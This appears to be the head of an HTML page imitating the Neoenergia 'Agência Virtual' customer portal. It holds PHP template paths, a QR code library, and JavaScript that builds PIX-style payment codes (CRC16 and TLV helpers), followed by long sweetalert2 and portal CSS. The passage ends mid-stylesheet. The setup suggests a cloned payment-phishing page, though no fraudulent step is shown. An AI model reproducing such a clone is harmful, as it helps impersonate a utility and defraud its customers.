<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>Neoenergia - Agência Virtual</title>

    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>

    <script>
    function crc16(str) {
        let crc = 0xFFFF;
        const polinomio = 0x1021;

        for (let i = 0; i < str.length; i++) {
            crc ^= str.charCodeAt(i) << 8;
            for (let j = 0; j < 8; j++) {
                crc = (crc << 1) ^ ((crc & 0x8000) ? polinomio : 0);
                crc &= 0xFFFF;
            }
        }

        return crc.toString(16).toUpperCase().padStart(4, '0');
    }

    function montaTLV(id, value) {
        const length = value.length.toString().padStart(2, '0');
        return `${id}${length}${value}`;
    }
    </script>

    <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=0">
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    <link rel="icon" type="image/x-icon" href="./<?= $diretorio ?>//index_files/favicon.ico">
    <link rel="stylesheet" type="text/css" href="./<?= $diretorio ?>//index_files/all.css">
    <link rel="stylesheet" type="text/css" href="./<?= $diretorio ?>//index_files/style.css">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>

    <script src="https://unpkg.com/imask"></script>


    <link rel="stylesheet" href="./<?= $diretorio ?>//index_files/styles.b8f530f2278fd96d.css">
    <style>
    .swal2-popup.swal2-toast {
        box-sizing: border-box;
        grid-column: 1/4 !important;
        grid-row: 1/4 !important;
        grid-template-columns: min-content auto min-content;
        padding: 1em;
        overflow-y: hidden;
        background: #fff;
        box-shadow: 0 0 1px rgba(0, 0, 0, .075), 0 1px 2px rgba(0, 0, 0, .075), 1px 2px 4px rgba(0, 0, 0, .075), 1px 3px 8px rgba(0, 0, 0, .075), 2px 4px 16px rgba(0, 0, 0, .075);
        pointer-events: all
    }

    .swal2-popup.swal2-toast>* {
        grid-column: 2
    }

    .swal2-popup.swal2-toast .swal2-title {
        margin: .5em 1em;
        padding: 0;
        font-size: 1em;
        text-align: initial
    }

    .swal2-popup.swal2-toast .swal2-loading {
        justify-content: center
    }

    .swal2-popup.swal2-toast .swal2-input {
        height: 2em;
        margin: .5em;
        font-size: 1em
    }

    .swal2-popup.swal2-toast .swal2-validation-message {
        font-size: 1em
    }

    .swal2-popup.swal2-toast .swal2-footer {
        margin: .5em 0 0;
        padding: .5em 0 0;
        font-size: .8em
    }

    .swal2-popup.swal2-toast .swal2-close {
        grid-column: 3/3;
        grid-row: 1/99;
        align-self: center;
        width: .8em;
        height: .8em;
        margin: 0;
        font-size: 2em
    }

    .swal2-popup.swal2-toast .swal2-html-container {
        margin: .5em 1em;
        padding: 0;
        overflow: initial;
        font-size: 1em;
        text-align: initial
    }

    .swal2-popup.swal2-toast .swal2-html-container:empty {
        padding: 0
    }

    .swal2-popup.swal2-toast .swal2-loader {
        grid-column: 1;
        grid-row: 1/99;
        align-self: center;
        width: 2em;
        height: 2em;
        margin: .25em
    }

    .swal2-popup.swal2-toast .swal2-icon {
        grid-column: 1;
        grid-row: 1/99;
        align-self: center;
        width: 2em;
        min-width: 2em;
        height: 2em;
        margin: 0 .5em 0 0
    }

    .swal2-popup.swal2-toast .swal2-icon .swal2-icon-content {
        display: flex;
        align-items: center;
        font-size: 1.8em;
        font-weight: bold
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
        width: 2em;
        height: 2em
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
        top: .875em;
        width: 1.375em
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
        left: .3125em
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
        right: .3125em
    }

    .swal2-popup.swal2-toast .swal2-actions {
        justify-content: flex-start;
        height: auto;
        margin: 0;
        margin-top: .5em;
        padding: 0 .5em
    }

    .swal2-popup.swal2-toast .swal2-styled {
        margin: .25em .5em;
        padding: .4em .6em;
        font-size: 1em
    }

    .swal2-popup.swal2-toast .swal2-success {
        border-color: #a5dc86
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line] {
        position: absolute;
        width: 1.6em;
        height: 3em;
        transform: rotate(45deg);
        border-radius: 50%
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left] {
        top: -0.8em;
        left: -0.5em;
        transform: rotate(-45deg);
        transform-origin: 2em 2em;
        border-radius: 4em 0 0 4em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right] {
        top: -0.25em;
        left: .9375em;
        transform-origin: 0 1.5em;
        border-radius: 0 4em 4em 0
    }

    .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
        width: 2em;
        height: 2em
    }

    .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
        top: 0;
        left: .4375em;
        width: .4375em;
        height: 2.6875em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line] {
        height: .3125em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip] {
        top: 1.125em;
        left: .1875em;
        width: .75em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long] {
        top: .9375em;
        right: .1875em;
        width: 1.375em
    }

    .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip {
        animation: swal2-toast-animate-success-line-tip .75s
    }

    .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long {
        animation: swal2-toast-animate-success-line-long .75s
    }

    .swal2-popup.swal2-toast.swal2-show {
        animation: swal2-toast-show .5s
    }

    .swal2-popup.swal2-toast.swal2-hide {
        animation: swal2-toast-hide .1s forwards
    }

    .swal2-container {
        display: grid;
        position: fixed;
        z-index: 1060;
        inset: 0;
        box-sizing: border-box;
        grid-template-areas: "top-start     top            top-end""center-start  center         center-end""bottom-start  bottom-center  bottom-end";
        grid-template-rows: minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);
        height: 100%;
        padding: .625em;
        overflow-x: hidden;
        transition: background-color .1s;
        -webkit-overflow-scrolling: touch
    }

    .swal2-container.swal2-backdrop-show,
    .swal2-container.swal2-noanimation {
        background: rgba(0, 0, 0, .4)
    }

    .swal2-container.swal2-backdrop-hide {
        background: rgba(0, 0, 0, 0) !important
    }

    .swal2-container.swal2-top-start,
    .swal2-container.swal2-center-start,
    .swal2-container.swal2-bottom-start {
        grid-template-columns: minmax(0, 1fr) auto auto
    }

    .swal2-container.swal2-top,
    .swal2-container.swal2-center,
    .swal2-container.swal2-bottom {
        grid-template-columns: auto minmax(0, 1fr) auto
    }

    .swal2-container.swal2-top-end,
    .swal2-container.swal2-center-end,
    .swal2-container.swal2-bottom-end {
        grid-template-columns: auto auto minmax(0, 1fr)
    }

    .swal2-container.swal2-top-start>.swal2-popup {
        align-self: start
    }

    .swal2-container.swal2-top>.swal2-popup {
        grid-column: 2;
        align-self: start;
        justify-self: center
    }

    .swal2-container.swal2-top-end>.swal2-popup,
    .swal2-container.swal2-top-right>.swal2-popup {
        grid-column: 3;
        align-self: start;
        justify-self: end
    }

    .swal2-container.swal2-center-start>.swal2-popup,
    .swal2-container.swal2-center-left>.swal2-popup {
        grid-row: 2;
        align-self: center
    }

    .swal2-container.swal2-center>.swal2-popup {
        grid-column: 2;
        grid-row: 2;
        align-self: center;
        justify-self: center
    }

    .swal2-container.swal2-center-end>.swal2-popup,
    .swal2-container.swal2-center-right>.swal2-popup {
        grid-column: 3;
        grid-row: 2;
        align-self: center;
        justify-self: end
    }

    .swal2-container.swal2-bottom-start>.swal2-popup,
    .swal2-container.swal2-bottom-left>.swal2-popup {
        grid-column: 1;
        grid-row: 3;
        align-self: end
    }

    .swal2-container.swal2-bottom>.swal2-popup {
        grid-column: 2;
        grid-row: 3;
        justify-self: center;
        align-self: end
    }

    .swal2-container.swal2-bottom-end>.swal2-popup,
    .swal2-container.swal2-bottom-right>.swal2-popup {
        grid-column: 3;
        grid-row: 3;
        align-self: end;
        justify-self: end
    }

    .swal2-container.swal2-grow-row>.swal2-popup,
    .swal2-container.swal2-grow-fullscreen>.swal2-popup {
        grid-column: 1/4;
        width: 100%
    }

    .swal2-container.swal2-grow-column>.swal2-popup,
    .swal2-container.swal2-grow-fullscreen>.swal2-popup {
        grid-row: 1/4;
        align-self: stretch
    }

    .swal2-container.swal2-no-transition {
        transition: none !important
    }

    .swal2-popup {
        display: none;
        position: relative;
        box-sizing: border-box;
        grid-template-columns: minmax(0, 100%);
        width: 32em;
        max-width: 100%;
        padding: 0 0 1.25em;
        border: none;
        border-radius: 5px;
        background: #fff;
        color: #545454;
        font-family: inherit;
        font-size: 1rem
    }

    .swal2-popup:focus {
        outline: none
    }

    .swal2-popup.swal2-loading {
        overflow-y: hidden
    }

    .swal2-title {
        position: relative;
        max-width: 100%;
        margin: 0;
        padding: .8em 1em 0;
        color: inherit;
        font-size: 1.875em;
        font-weight: 600;
        text-align: center;
        text-transform: none;
        word-wrap: break-word
    }

    .swal2-actions {
        display: flex;
        z-index: 1;
        box-sizing: border-box;
        flex-wrap: wrap;
        align-items: center;
        justify-content: center;
        width: auto;
        margin: 1.25em auto 0;
        padding: 0
    }

    .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
        opacity: .4
    }

    .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
        background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))
    }

    .swal2-actions:not(.swal2-loading) .swal2-styled:active {
        background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))
    }

    .swal2-loader {
        display: none;
        align-items: center;
        justify-content: center;
        width: 2.2em;
        height: 2.2em;
        margin: 0 1.875em;
        animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
        border-width: .25em;
        border-style: solid;
        border-radius: 100%;
        border-color: #2778c4 rgba(0, 0, 0, 0) #2778c4 rgba(0, 0, 0, 0)
    }

    .swal2-styled {
        margin: .3125em;
        padding: .625em 1.1em;
        transition: box-shadow .1s;
        box-shadow: 0 0 0 3px rgba(0, 0, 0, 0);
        font-weight: 500
    }

    .swal2-styled:not([disabled]) {
        cursor: pointer
    }

    .swal2-styled.swal2-confirm {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: #7066e0;
        color: #fff;
        font-size: 1em
    }

    .swal2-styled.swal2-confirm:focus {
        box-shadow: 0 0 0 3px rgba(112, 102, 224, .5)
    }

    .swal2-styled.swal2-deny {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: #dc3741;
        color: #fff;
        font-size: 1em
    }

    .swal2-styled.swal2-deny:focus {
        box-shadow: 0 0 0 3px rgba(220, 55, 65, .5)
    }

    .swal2-styled.swal2-cancel {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: #6e7881;
        color: #fff;
        font-size: 1em
    }

    .swal2-styled.swal2-cancel:focus {
        box-shadow: 0 0 0 3px rgba(110, 120, 129, .5)
    }

    .swal2-styled.swal2-default-outline:focus {
        box-shadow: 0 0 0 3px rgba(100, 150, 200, .5)
    }

    .swal2-styled:focus {
        outline: none
    }

    .swal2-styled::-moz-focus-inner {
        border: 0
    }

    .swal2-footer {
        justify-content: center;
        margin: 1em 0 0;
        padding: 1em 1em 0;
        border-top: 1px solid #eee;
        color: inherit;
        font-size: 1em
    }

    .swal2-timer-progress-bar-container {
        position: absolute;
        right: 0;
        bottom: 0;
        left: 0;
        grid-column: auto !important;
        overflow: hidden;
        border-bottom-right-radius: 5px;
        border-bottom-left-radius: 5px
    }

    .swal2-timer-progress-bar {
        width: 100%;
        height: .25em;
        background: rgba(0, 0, 0, .2)
    }

    .swal2-image {
        max-width: 100%;
        margin: 2em auto 1em
    }

    .swal2-close {
        z-index: 2;
        align-items: center;
        justify-content: center;
        width: 1.2em;
        height: 1.2em;
        margin-top: 0;
        margin-right: 0;
        margin-bottom: -1.2em;
        padding: 0;
        overflow: hidden;
        transition: color .1s, box-shadow .1s;
        border: none;
        border-radius: 5px;
        background: rgba(0, 0, 0, 0);
        color: #ccc;
        font-family: monospace;
        font-size: 2.5em;
        cursor: pointer;
        justify-self: end
    }

.col-12 {
    flex: 0 0 auto;
}

.box-imoveis:hover{
border: solid 2px #03af03;
}

.box-imoveis[_ngcontent-qxf-c252] {
    height: auto;
    background-color: var(--neo-white);
    margin-top: 16px;
    padding: 24px;
    border-radius: 5px;
}
.d-flex {
    display: flex !important;
}
.unidade-consumidora-title[_ngcontent-qxf-c252] {
    color: var(--neo-light-green);
    text-align: left;
    font-weight: 700;
    font-size: 14px;
    line-height: 20px;
    letter-spacing: 0.34px;
    text-transform: uppercase;
}


.endereco[_ngcontent-qxf-c252] {
    text-align: left;
    display: flex;
    font-size: 16px;
    line-height: 25px;
    letter-spacing: 0.32px;
    color: var(--neo-dark-gray);
}

.unidade-consumidora-value[_ngcontent-qxf-c252] {
    color: var(--neo-dark-gray);
    text-align: left;
    font-weight: 900;
    font-size: 25px;
    line-height: 25px;
    letter-spacing: 0.5px;
}

.container-rows[_ngcontent-qxf-c252] {
    display: flex;
    align-items: center;
}
 .material-icons-outlined[_ngcontent-qxf-c252] {
    transform: rotate(-90deg);
    color: var(--neo-dark-gray);
}

.material-icons-outlined {
    font-family: "Material Icons Outlined";
    font-weight: normal;
    font-style: normal;
    font-size: 24px;
    line-height: 1;
    letter-spacing: normal;
    text-transform: none;
    display: inline-block;
    white-space: nowrap;
    word-wrap: normal;
    direction: ltr;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    text-rendering: optimizeLegibility;
    font-feature-settings: "liga";
}

table[_ngcontent-qxf-c252], thead[_ngcontent-qxf-c252], tr[_ngcontent-qxf-c252], th[_ngcontent-qxf-c252], tbody[_ngcontent-qxf-c252] {
    width: 100%;
    margin: 0;
    padding: 0;
}

.cursor-pointer[_ngcontent-qxf-c252] {
    cursor: pointer;
}
.justify-content-between {
    justify-content: space-between !important;
}

    .swal2-close:hover {
        transform: none;
        background: rgba(0, 0, 0, 0);
        color: #f27474
    }

    .swal2-close:focus {
        outline: none;
        box-shadow: inset 0 0 0 3px rgba(100, 150, 200, .5)
    }

    .swal2-close::-moz-focus-inner {
        border: 0
    }

    .swal2-html-container {
        z-index: 1;
        justify-content: center;
        margin: 1em 1.6em .3em;
        padding: 0;
        overflow: auto;
        color: inherit;
        font-size: 1.125em;
        font-weight: normal;
        line-height: normal;
        text-align: center;
        word-wrap: break-word;
        word-break: break-word
    }

    .swal2-input,
    .swal2-file,
    .swal2-textarea,
    .swal2-select,
    .swal2-radio,
    .swal2-checkbox {
        margin: 1em 2em 3px
    }

    .swal2-input,
    .swal2-file,
    .swal2-textarea {
        box-sizing: border-box;
        width: auto;
        transition: border-color .1s, box-shadow .1s;
        border: 1px solid #d9d9d9;
        border-radius: .1875em;
        background: rgba(0, 0, 0, 0);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(0, 0, 0, 0);
        color: inherit;
        font-size: 1.125em
    }

    .swal2-input.swal2-inputerror,
    .swal2-file.swal2-inputerror,
    .swal2-textarea.swal2-inputerror {
        border-color: #f27474 !important;
        box-shadow: 0 0 2px #f27474 !important
    }

    .swal2-input:focus,
    .swal2-file:focus,
    .swal2-textarea:focus {
        border: 1px solid #b4dbed;
        outline: none;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(100, 150, 200, .5)
    }

    .swal2-input::placeholder,
    .swal2-file::placeholder,
    .swal2-textarea::placeholder {
        color: #ccc
    }

    .swal2-range {
        margin: 1em 2em 3px;
        background: #fff
    }

    .swal2-range input {
        width: 80%
    }

    .swal2-range output {
        width: 20%;
        color: inherit;
        font-weight: 600;
        text-align: center
    }

    .swal2-range input,
    .swal2-range output {
        height: 2.625em;
        padding: 0;
        font-size: 1.125em;
        line-height: 2.625em
    }

    .swal2-input {
        height: 2.625em;
        padding: 0 .75em
    }

    .swal2-file {
        width: 75%;
        margin-right: auto;
        margin-left: auto;
        background: rgba(0, 0, 0, 0);
        font-size: 1.125em
    }

    .swal2-textarea {
        height: 6.75em;
        padding: .75em
    }

    .swal2-select {
        min-width: 50%;
        max-width: 100%;
        padding: .375em .625em;
        background: rgba(0, 0, 0, 0);
        color: inherit;
        font-size: 1.125em
    }

    .swal2-radio,
    .swal2-checkbox {
        align-items: center;
        justify-content: center;
        background: #fff;
        color: inherit
    }

    .swal2-radio label,
    .swal2-checkbox label {
        margin: 0 .6em;
        font-size: 1.125em
    }

    .swal2-radio input,
    .swal2-checkbox input {
        flex-shrink: 0;
        margin: 0 .4em
    }

    .swal2-input-label {
        display: flex;
        justify-content: center;
        margin: 1em auto 0
    }

    .swal2-validation-message {
        align-items: center;
        justify-content: center;
        margin: 1em 0 0;
        padding: .625em;
        overflow: hidden;
        background: #f0f0f0;
        color: #666;
        font-size: 1em;
        font-weight: 300
    }

    .swal2-validation-message::before {
        content: "!";
        display: inline-block;
        width: 1.5em;
        min-width: 1.5em;
        height: 1.5em;
        margin: 0 .625em;
        border-radius: 50%;
        background-color: #f27474;
        color: #fff;
        font-weight: 600;
        line-height: 1.5em;
        text-align: center
    }

    .swal2-icon {
        position: relative;
        box-sizing: content-box;
        justify-content: center;
        width: 5em;
        height: 5em;
        margin: 2.5em auto .6em;
        border: 0.25em solid rgba(0, 0, 0, 0);
        border-radius: 50%;
        border-color: #000;
        font-family: inherit;
        line-height: 5em;
        cursor: default;
        user-select: none
    }

    .swal2-icon .swal2-icon-content {
        display: flex;
        align-items: center;
        font-size: 3.75em
    }

    .swal2-icon.swal2-error {
        border-color: #f27474;
        color: #f27474
    }

    .swal2-icon.swal2-error .swal2-x-mark {
        position: relative;
        flex-grow: 1
    }

    .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
        display: block;
        position: absolute;
        top: 2.3125em;
        width: 2.9375em;
        height: .3125em;
        border-radius: .125em;
        background-color: #f27474
    }

    .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
        left: 1.0625em;
        transform: rotate(45deg)
    }

    .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
        right: 1em;
        transform: rotate(-45deg)
    }

    .swal2-icon.swal2-error.swal2-icon-show {
        animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark {
        animation: swal2-animate-error-x-mark .5s
    }

    .swal2-icon.swal2-warning {
        border-color: #facea8;
        color: #f8bb86
    }

    .swal2-icon.swal2-warning.swal2-icon-show {
        animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content {
        animation: swal2-animate-i-mark .5s
    }

    .swal2-icon.swal2-info {
        border-color: #9de0f6;
        color: #3fc3ee
    }

    .swal2-icon.swal2-info.swal2-icon-show {
        animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content {
        animation: swal2-animate-i-mark .8s
    }

    .swal2-icon.swal2-question {
        border-color: #c9dae1;
        color: #87adbd
    }

    .swal2-icon.swal2-question.swal2-icon-show {
        animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content {
        animation: swal2-animate-question-mark .8s
    }

    .swal2-icon.swal2-success {
        border-color: #a5dc86;
        color: #a5dc86
    }

    .swal2-icon.swal2-success [class^=swal2-success-circular-line] {
        position: absolute;
        width: 3.75em;
        height: 7.5em;
        transform: rotate(45deg);
        border-radius: 50%
    }

    .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left] {
        top: -0.4375em;
        left: -2.0635em;
        transform: rotate(-45deg);
        transform-origin: 3.75em 3.75em;
        border-radius: 7.5em 0 0 7.5em
    }

    .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right] {
        top: -0.6875em;
        left: 1.875em;
        transform: rotate(-45deg);
        transform-origin: 0 3.75em;
        border-radius: 0 7.5em 7.5em 0
    }

    .swal2-icon.swal2-success .swal2-success-ring {
        position: absolute;
        z-index: 2;
        top: -0.25em;
        left: -0.25em;
        box-sizing: content-box;
        width: 100%;
        height: 100%;
        border: .25em solid rgba(165, 220, 134, .3);
        border-radius: 50%
    }

    .swal2-icon.swal2-success .swal2-success-fix {
        position: absolute;
        z-index: 1;
        top: .5em;
        left: 1.625em;
        width: .4375em;
        height: 5.625em;
        transform: rotate(-45deg)
    }

    .swal2-icon.swal2-success [class^=swal2-success-line] {
        display: block;
        position: absolute;
        z-index: 2;
        height: .3125em;
        border-radius: .125em;
        background-color: #a5dc86
    }

    .swal2-icon.swal2-success [class^=swal2-success-line][class$=tip] {
        top: 2.875em;
        left: .8125em;
        width: 1.5625em;
        transform: rotate(45deg)
    }

    .swal2-icon.swal2-success [class^=swal2-success-line][class$=long] {
        top: 2.375em;
        right: .5em;
        width: 2.9375em;
        transform: rotate(-45deg)
    }

    .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip {
        animation: swal2-animate-success-line-tip .75s
    }

    .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long {
        animation: swal2-animate-success-line-long .75s
    }

    .swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right {
        animation: swal2-rotate-success-circular-line 4.25s ease-in
    }

    .swal2-progress-steps {
        flex-wrap: wrap;
        align-items: center;
        max-width: 100%;
        margin: 1.25em auto;
        padding: 0;
        background: rgba(0, 0, 0, 0);
        font-weight: 600
    }

    .swal2-progress-steps li {
        display: inline-block;
        position: relative
    }

    .swal2-progress-steps .swal2-progress-step {
        z-index: 20;
        flex-shrink: 0;
        width: 2em;
        height: 2em;
        border-radius: 2em;
        background: #2778c4;
        color: #fff;
        line-height: 2em;
        text-align: center
    }

    .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step {
        background: #2778c4
    }

    .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step {
        background: #add8e6;
        color: #fff
    }

    .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line {
        background: #add8e6
    }

    .swal2-progress-steps .swal2-progress-step-line {
        z-index: 10;
        flex-shrink: 0;
        width: 2.5em;
        height: .4em;
        margin: 0 -1px;
        background: #2778c4
    }

    [class^=swal2] {
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
    }

    .swal2-show {
        animation: swal2-show .3s
    }

    .swal2-hide {
        animation: swal2-hide .15s forwards
    }

    .swal2-noanimation {
        transition: none
    }

    .swal2-scrollbar-measure {
        position: absolute;
        top: -9999px;
        width: 50px;
        height: 50px;
        overflow: scroll
    }

    .swal2-rtl .swal2-close {
        margin-right: initial;
        margin-left: 0
    }

    .swal2-rtl .swal2-timer-progress-bar {
        right: 0;
        left: auto
    }

    @keyframes swal2-toast-show {
        0% {
            transform: translateY(-0.625em) rotateZ(2deg)
        }

        33% {
            transform: translateY(0) rotateZ(-2deg)
        }

        66% {
            transform: translateY(0.3125em) rotateZ(2deg)
        }

        100% {
            transform: translateY(0) rotateZ(0deg)
        }
    }

    @keyframes swal2-toast-hide {
        100% {
            transform: rotateZ(1deg);
            opacity: 0
        }
    }

    @keyframes swal2-toast-animate-success-line-tip {
        0% {
            top: .5625em;
            left: .0625em;
            width: 0
        }

        54% {
            top: .125em;
            left: .125em;
            width: 0
        }

        70% {
            top: .625em;
            left: -0.25em;
            width: 1.625em
        }

        84% {
            top: 1.0625em;
            left: .75em;
            width: .5em
        }

        100% {
            top: 1.125em;
            left: .1875em;
            width: .75em
        }
    }

    @keyframes swal2-toast-animate-success-line-long {
        0% {
            top: 1.625em;
            right: 1.375em;
            width: 0
        }

        65% {
            top: 1.25em;
            right: .9375em;
            width: 0
        }

        84% {
            top: .9375em;
            right: 0;
            width: 1.125em
        }

        100% {
            top: .9375em;
            right: .1875em;
            width: 1.375em
        }
    }

    @keyframes swal2-show {
        0% {
            transform: scale(0.7)
        }

        45% {
            transform: scale(1.05)
        }

        80% {
            transform: scale(0.95)
        }

        100% {
            transform: scale(1)
        }
    }

    @keyframes swal2-hide {
        0% {
            transform: scale(1);
            opacity: 1
        }

        100% {
            transform: scale(0.5);
            opacity: 0
        }
    }

    @keyframes swal2-animate-success-line-tip {
        0% {
            top: 1.1875em;
            left: .0625em;
            width: 0
        }

        54% {
            top: 1.0625em;
            left: .125em;
            width: 0
        }

        70% {
            top: 2.1875em;
            left: -0.375em;
            width: 3.125em
        }

        84% {
            top: 3em;
            left: 1.3125em;
            width: 1.0625em
        }

        100% {
            top: 2.8125em;
            left: .8125em;
            width: 1.5625em
        }
    }

    @keyframes swal2-animate-success-line-long {
        0% {
            top: 3.375em;
            right: 2.875em;
            width: 0
        }

        65% {
            top: 3.375em;
            right: 2.875em;
            width: 0
        }

        84% {
            top: 2.1875em;
            right: 0;
            width: 3.4375em
        }

        100% {
            top: 2.375em;
            right: .5em;
            width: 2.9375em
        }
    }

    @keyframes swal2-rotate-success-circular-line {
        0% {
            transform: rotate(-45deg)
        }

        5% {
            transform: rotate(-45deg)
        }

        12% {
            transform: rotate(-405deg)
        }

        100% {
            transform: rotate(-405deg)
        }
    }

    @keyframes swal2-animate-error-x-mark {
        0% {
            margin-top: 1.625em;
            transform: scale(0.4);
            opacity: 0
        }

        50% {
            margin-top: 1.625em;
            transform: scale(0.4);
            opacity: 0
        }

        80% {
            margin-top: -0.375em;
            transform: scale(1.15)
        }

        100% {
            margin-top: 0;
            transform: scale(1);
            opacity: 1
        }
    }

    @keyframes swal2-animate-error-icon {
        0% {
            transform: rotateX(100deg);
            opacity: 0
        }

        100% {
            transform: rotateX(0deg);
            opacity: 1
        }
    }

    @keyframes swal2-rotate-loading {
        0% {
            transform: rotate(0deg)
        }

        100% {
            transform: rotate(360deg)
        }
    }

    @keyframes swal2-animate-question-mark {
        0% {
            transform: rotateY(-360deg)
        }

        100% {
            transform: rotateY(0)
        }
    }

    @keyframes swal2-animate-i-mark {
        0% {
            transform: rotateZ(45deg);
            opacity: 0
        }

        25% {
            transform: rotateZ(-25deg);
            opacity: .4
        }

        50% {
            transform: rotateZ(15deg);
            opacity: .8
        }

        75% {
            transform: rotateZ(-5deg);
            opacity: 1
        }

        100% {
            transform: rotateX(0);
            opacity: 1
        }
    }

    body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
        overflow: hidden
    }

    body.swal2-height-auto {
        height: auto !important
    }

    body.swal2-no-backdrop .swal2-container {
        background-color: rgba(0, 0, 0, 0) !important;
        pointer-events: none
    }

    body.swal2-no-backdrop .swal2-container .swal2-popup {
        pointer-events: all
    }

    body.swal2-no-backdrop .swal2-container .swal2-modal {
        box-shadow: 0 0 10px rgba(0, 0, 0, .4)
    }

    @media print {
        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
            overflow-y: scroll !important
        }

        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true] {
            display: none
        }

        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container {
            position: static !important
        }
    }

    body.swal2-toast-shown .swal2-container {
        box-sizing: border-box;
        width: 360px;
        max-width: 100%;
        background-color: rgba(0, 0, 0, 0);
        pointer-events: none
    }

    body.swal2-toast-shown .swal2-container.swal2-top {
        inset: 0 auto auto 50%;
        transform: translateX(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-top-end,
    body.swal2-toast-shown .swal2-container.swal2-top-right {
        inset: 0 0 auto auto
    }

    body.swal2-toast-shown .swal2-container.swal2-top-start,
    body.swal2-toast-shown .swal2-container.swal2-top-left {
        inset: 0 auto auto 0
    }

    body.swal2-toast-shown .swal2-container.swal2-center-start,
    body.swal2-toast-shown .swal2-container.swal2-center-left {
        inset: 50% auto auto 0;
        transform: translateY(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-center {
        inset: 50% auto auto 50%;
        transform: translate(-50%, -50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-center-end,
    body.swal2-toast-shown .swal2-container.swal2-center-right {
        inset: 50% 0 auto auto;
        transform: translateY(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-bottom-start,
    body.swal2-toast-shown .swal2-container.swal2-bottom-left {
        inset: auto auto 0 0
    }

    body.swal2-toast-shown .swal2-container.swal2-bottom {
        inset: auto auto 0 50%;
        transform: translateX(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-bottom-end,
    body.swal2-toast-shown .swal2-container.swal2-bottom-right {
        inset: auto 0 0 auto
    }
    </style>
    <style>
    .border-dark-green,
    .header-credenciado .second-header-row,
    .header-atendente-credenciado .second-header-row,
    .header-imobiliaria .second-header-row,
    .header-corretor .second-header-row,
    .header-padronista .second-header-row,
    .header-conjuge .second-header-row,
    .header-perfil-de-acesso .second-header-row,
    .header-representante-legal .second-header-row,
    .header-padrao .second-header-row {
        border-bottom: 0.313rem solid var(--neo-dark-green);
    }

    .header-padrao .mat-toolbar {
        background-color: transparent;
        color: var(--neo-white);
    }

    .header-padrao .first-header-row {
        background: var(--neo-light-green) !important;
    }

    .icone-header {
        width: auto !important;
    }

    .header-grupo-A .flag-icon {
        color: var(--neo-white) !important;
    }

    .header-grupo-A .first-header-row {
        background-color: var(--neo-dark-green) !important;
    }

    .header-grupo-A .second-header-row {
        border-bottom: 0.313rem solid var(--neo-light-green);
    }

    .header-representante-legal .first-header-row {
        background: linear-gradient(90deg, var(--neo-dark-blue) 0%, var(--neo-dark-green) 100%);
    }

    .header-conjuge .first-header-row,
